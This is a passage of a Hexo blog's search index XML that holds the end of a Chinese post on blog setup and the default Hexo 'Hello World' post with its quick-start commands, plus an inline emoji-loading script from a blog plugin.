alt=""></p><p>好了就先到这里吧。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设与优化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> github </tag>
            
            <tag> 博客 </tag>
            
            <tag> coding </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/04/18/hello-world/"/>
      <url>/2020/04/18/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
